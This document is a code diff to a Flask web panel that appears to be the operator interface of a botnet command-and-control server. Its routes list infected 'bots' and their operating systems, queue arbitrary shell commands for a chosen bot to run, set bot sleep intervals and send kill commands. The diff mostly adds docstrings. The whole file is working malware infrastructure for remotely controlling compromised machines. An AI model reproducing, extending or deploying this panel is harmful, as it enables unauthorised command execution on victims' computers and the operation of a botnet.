@@ -8,11 +8,12 @@ import json
 
 @app.before_first_request
 def before_first():
-    master_t = Thread(target=master.main)
-    master_t.start()
+    """right before the first request is made the master server is started"""
+    master.main()
 
 @app.before_request
 def before_request():
+    """Update queue and user in the app and check the app killswitch"""
     if app.killswitch:
         abort(500)
     g.queue = master.queue
@@ -27,12 +28,14 @@ def index():
 @app.route('/kill')
 @login_required
 def kill():
+    """Kills the application until the server is restarted"""
     app.killswitch = 1
     abort(500)
 
 @app.route("/api/clients/list", methods=["GET"])
 @login_required
 def api_clients_list():
+    """Generates json data for all active bots"""
     bots = Bot.query.all()
     data = {}
     for bot in bots:
@@ -59,6 +62,7 @@ def api_clients_list():
 @app.route("/api/clients/cmd/<int:id>", methods=["POST"])
 @login_required
 def api_clients_cmd(id):
+    """Adds a command to a bot's command queue"""
     data = json.loads(request.get_data())
     bot = Bot.query.filter_by(id=id).one()
     g.queue[bot.ip].append("run:"+data['cmd'])
@@ -67,6 +71,7 @@ def api_clients_cmd(id):
 @app.route("/api/clients/clearq/<int:id>")
 @login_required
 def api_clients_clearq(id):
+    """Deletes all entries in a bot's queue"""
     bot = Bot.query.filter_by(id=id).one()
     del g.queue[bot.ip][:]
     return "", 200
@@ -74,6 +79,7 @@ def api_clients_clearq(id):
 @app.route("/api/clients/sleep/<int:id>", methods=["POST"])
 @login_required
 def api_clients_sleep(id):
+    """Adds a set sleep command to a bot's command queue"""
     data = json.loads(request.get_data())
     try: int(data['interval'])
     except: return "", 500
@@ -87,6 +93,7 @@ def api_clients_sleep(id):
 @app.route("/api/clients/kill/<int:id>")
 @login_required
 def api_clients_kill(id):
+    """Add the kill command to a bot's command queue"""
     try:
         bot = Bot.query.filter_by(id=id).one()
     except: return "", 500
@@ -107,8 +114,8 @@ def api_clients_delete(id):
 @app.route("/bots")
 @login_required
 def bots():
-    bots = Bot.query.all()
-    bots = [ x for x in bots if x.last_command is not None and x.os is not None ]
+    """Queries for all active bots and renders the bot page"""
+    bots = [ x for x in Bot.query.all() if x.last_command is not None and x.os is not None ]
     cmd_form = RunCommand()
     int_form = SetSleepInterval()
     return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form, bots=bots)
